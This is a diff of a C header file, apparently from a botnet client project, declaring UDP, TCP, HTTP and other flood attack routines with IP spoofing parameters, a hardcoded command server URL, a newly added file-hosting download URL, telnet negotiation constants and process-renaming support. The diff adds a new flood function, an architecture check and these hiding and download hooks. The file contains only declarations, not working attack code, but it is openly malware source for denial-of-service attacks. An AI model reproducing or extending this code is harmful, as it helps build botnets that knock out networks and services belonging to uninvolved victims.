@@ -1,19 +1,14 @@
-/* ************************************************************************** */
-/*                                                                            */
-/*                                                        :::      ::::::::   */
-/*   px_ssh.h                                           :+:      :+:    :+:   */
-/*                                                    +:+ +:+         +:+     */
-/*   By: tnard <tnard@student.42lyon.fr>            +#+  +:+       +#+        */
-/*                                                +#+#+#+#+#+   +#+           */
-/*   Created: 2022/03/24 12:30:18 by tnard             #+#    #+#             */
-/*   Updated: 2022/03/24 12:30:18 by tnard            ###   ########lyon.fr   */
-/*                                                                            */
-/* ************************************************************************** */
+/* ---------------------------------------
 
+
+	Todo:
+		- Add multiple servers list
+
+
+   --------------------------------------- */
 #ifndef PX_SSH_H
 # define PX_SSH_H
 
-# include <libssh/libssh.h> // to remove if can't cross compile
 # include <stdlib.h>
 # include <stdio.h> 
 # include <string.h>
@@ -47,9 +42,18 @@
 # include <sys/wait.h>
 # include <sys/ioctl.h>
 # include <net/if.h>
+# include <sys/prctl.h>
 
 # define STD2_SIZE 1024
 # define PHI 0x9e3779b9
+# define CMD_IAC   255
+# define CMD_WILL  251
+# define CMD_WONT  252
+# define CMD_DO    253
+# define CMD_DONT  254
+# define OPT_SGA   3
+
+# define PR_SET_NAME 15
 
 # define true 1
 # define false 0
@@ -59,6 +63,7 @@
 # include "../libft/libft.h"
 
 # define url "gdjgufsdhugfsadyuihfyuisdghf.pandeo.fr"
+# define download_url "anonfile"
 # define url_page "/api.php"
 
 char			*ft_strnjoin(char *s1, char *s2, int n);
@@ -70,6 +75,7 @@ void			ft_generate_ip(char *ip);
 void			ft_free_split(char **split);
 char			*ft_request(char *post);
 int				ft_split_len(char **split);
+char			*ft_getarch();
 
 // Protocol
 // 			General
@@ -86,7 +92,6 @@ void			init_rand(uint32_t x);
 void			OVHL7(char *host, in_port_t port, int timeEnd, int power);
 void			UDPRAW(unsigned char *ip, int port, int secs);
 void			XTDCUSTOM(unsigned char *ip, int port, int secs);
-void			UNKNOWN(unsigned char *ip, int port, int secs);
 void			UDPRAW(unsigned char *ip, int port, int secs);
 void			UDP(unsigned char *target, int port, int timeEnd, int packetsize, int pollinterval, int spoofit);
 void			TCP(unsigned char *target, int port, int timeEnd, unsigned char *flags, int packetsize, int pollinterval, int spoofit);
@@ -95,7 +100,7 @@ void			RANDHEX(unsigned char *ip, int port, int secs);
 void			OVHL7(char *host, in_port_t port, int timeEnd, int power);
 void			JUNK(unsigned char *ip, int port, int end_time);
 void			HTTP(char *method, char *host, in_port_t port, char *path, int timeEnd, int power);
-void			CNC(unsigned char *ip, int port, int end_time);
+void			PPS(char *host, in_port_t port, int timeEnd, int power);
 void			HOLD(unsigned char *ip, int port, int end_time);
 
 #endif
